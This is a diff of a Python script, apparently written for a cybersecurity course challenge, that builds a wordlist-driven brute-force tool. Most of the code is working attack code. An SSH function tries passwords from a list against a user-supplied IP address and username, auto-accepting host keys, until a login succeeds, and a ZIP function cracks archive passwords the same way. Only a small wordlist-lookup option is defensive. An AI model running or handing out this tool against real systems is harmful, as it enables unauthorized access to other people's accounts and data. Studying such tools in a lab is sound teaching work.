@@ -1,93 +1,110 @@
 #!/usr/bin/env python3
 
-# Script Name:                  ops401code/ops-401d1:Challenge18.py
+# Script Name:                  ops-401d1:Challenge17.py
 # Author:                       Cody Blahnik
-# Date of latest revision:      5/21/24
+# Date of latest revision:      5/20/24
 # Purpose:                      Brute force tool using wordlists
 
-
-import zipfile
 import time
 import paramiko
+import zipfile
 
-# Function to perform brute-force attack for both SSH and ZIP file passwords
-def brute_force(word_list, target, attack_type, delay=0):
-    for word in word_list:
-        word = word.strip()
-        print(f"Trying password: {word}")
-        if attack_type == 'ssh':
-            try:
-                # Attempt to connect to SSH with the given password
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(target['ip'], username=target['username'], password=word, timeout=1)
-                print(f"Success! The password is: {word}")
-                ssh.close()
-                return word
-            except paramiko.AuthenticationException:
-                print("Authentication failed.")
-            except paramiko.SSHException as sshException:
-                print(f"Unable to establish SSH connection: {sshException}")
-            except Exception as e:
-                print(f"Exception: {e}")
-            time.sleep(delay)
-        elif attack_type == 'zip':
-            try:
-                # Attempt to extract the ZIP file with the given password
-                with zipfile.ZipFile(target['zip_file'], 'r') as zfile:
-                    zfile.extractall(pwd=bytes(word, 'utf-8'))
-                    print(f"Success! The password is: {word}")
-                    return word
-            except (RuntimeError, zipfile.BadZipFile):
-                pass
-    print("Brute-force attack failed. No password matched.")
-    return None
-
-# Function to handle the offensive (attack) mode
+# Function to perform offensive task
 def offensive():
-    choice = input("Select attack type (1 for SSH, 2 for ZIP): ")
     file_path = input("Enter the word list file path: ")
+    delay = float(input("Enter the delay between words (in seconds): "))
     
-    # Read the word list from the provided file
-    with open(file_path, encoding="ISO-8859-1") as file:
-        word_list = file.readlines()
-        
-    if choice == '1':
-        target = {
-            'ip': input("Enter the SSH server IP address: "),
-            'username': input("Enter the SSH username: ")
-        }
-        delay = float(input("Enter the delay between attempts (in seconds): "))
-        brute_force(word_list, target, 'ssh', delay)
-    elif choice == '2':
-        target = {'zip_file': input("Enter the path to the ZIP file: ")}
-        brute_force(word_list, target, 'zip')
-    else:
-        print("Invalid choice.")
+    try:
+        with open(file_path, encoding="ISO-8859-1") as file:
+            for word in file:
+                word = word.strip()
+                print(word)
+                time.sleep(delay)
+    except FileNotFoundError:
+        print(f"File not found: {file_path}")
 
-# Function to handle the defensive mode (search for a string in the word list)
+# Function to perform defensive task
 def defensive():
     user_string = input("Enter the string to search for: ")
     file_path = input("Enter the word list file path: ")
-    
-    # Search for the user-provided string in the word list
-    with open(file_path, 'r', encoding="ISO-8859-1") as file:
-        word_list = file.readlines()
-        if any(user_string in word for word in word_list):
+
+    try:
+        with open(file_path, encoding="ISO-8859-1") as file:
+            word_list = [word.strip() for word in file]
+            
+        if user_string in word_list:
             print(f"The string '{user_string}' was found in the word list.")
         else:
             print(f"The string '{user_string}' was NOT found in the word list.")
+    except FileNotFoundError:
+        print(f"File not found: {file_path}")
+
+# Function to perform SSH brute force attack
+def ssh_brute_force():
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    ip_address = input("Enter the SSH server IP address: ")
+    username = input("Enter the SSH username: ")
+    file_path = input("Enter the word list file path: ")
+    delay = float(input("Enter the delay between attempts (in seconds): "))
+
+    try:
+        with open(file_path, encoding="ISO-8859-1") as file:
+            for password in file:
+                password = password.strip()
+                try:
+                    ssh.connect(ip_address, username=username, password=password)
+                    print(f"Login successful with password: {password}")
+                    return
+                except paramiko.AuthenticationException:
+                    print(f"Failed login with password: {password}")
+                time.sleep(delay)
+        print("Brute force attempt complete. No valid password found.")
+    except FileNotFoundError:
+        print(f"File not found: {file_path}")
+    finally:
+        ssh.close()
+
+# Function to perform ZIP file brute force attack
+def zip_brute_force():
+    zip_path = input("Enter the path to the password-protected ZIP file: ")
+    wordlist_path = input("Enter the word list file path: ")
+
+    try:
+        with zipfile.ZipFile(zip_path, 'r') as zip_file:
+            with open(wordlist_path, encoding="ISO-8859-1") as file:
+                for word in file:
+                    password = word.strip().encode('utf-8')
+                    try:
+                        zip_file.extractall(pwd=password)
+                        print(f"Password found: {word.strip()}")
+                        return
+                    except (RuntimeError, zipfile.BadZipFile):
+                        print(f"Failed attempt with password: {word.strip()}")
+        print("Brute force attempt complete. No valid password found.")
+    except FileNotFoundError:
+        print(f"File not found: {zip_path} or {wordlist_path}")
+    except zipfile.BadZipFile:
+        print(f"Invalid ZIP file: {zip_path}")
 
 # Main menu for user interaction
 def main():
     print("Automated Brute Force Wordlist")
     print("1. Offensive; Dictionary Iterator")
     print("2. Defensive; Password Recognized")
-    choice = input("Select an option (1 or 2): ")
+    print("3. SSH Brute Force")
+    print("4. ZIP File Brute Force")
+    choice = input("Select an option (1, 2, 3, or 4): ")
+
     if choice == '1':
         offensive()
     elif choice == '2':
         defensive()
+    elif choice == '3':
+        ssh_brute_force()
+    elif choice == '4':
+        zip_brute_force()
     else:
         print("Invalid choice. Exiting.")
 
